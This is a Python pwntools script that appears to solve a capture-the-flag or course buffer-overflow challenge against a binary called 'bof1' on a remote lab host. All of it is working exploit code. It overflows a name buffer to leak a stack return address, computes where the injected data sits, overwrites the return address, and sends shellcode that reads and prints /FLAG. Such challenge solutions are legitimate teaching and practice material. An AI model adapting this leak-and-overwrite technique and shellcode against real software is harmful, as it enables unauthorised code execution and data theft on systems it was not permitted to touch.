from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 12342

elf = ELF(exe)
off_main = elf.symbols[b'main']
ret = 0
qemu_ret = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_ret = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


sc = shellcraft.open("/FLAG", 0)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)
# print(shellcode)

# overflow buf1 to get return address
payload1 = b'A' * 56
r.sendafter(b'name? ', payload1)
r.recvuntil(b'Welcome, ' + payload1)

# read 6 leaked bytes and pad to 8 bytes
leak = r.recvn(6)
leak += b'\x00\x00'

ret = int.from_bytes(leak, byteorder='little')
ret_byte = ret.to_bytes(8, byteorder='little')
print("Return address: ", hex(ret))

# msg - return address
offset = 0x75c597c27220 - 0x75c597b41c99
addr = ret + offset
addr_btye = addr.to_bytes(8, byteorder='little')
r.sendafter(b'number? ', b'C' * 104 + addr_btye)

r.sendafter(b'name? ', b'1234')
r.sendafter(b'message: ', shellcode)

r.readuntil(b'you!\n')
print(r.readuntil(b'}'))
# r.interactive()
r.close()
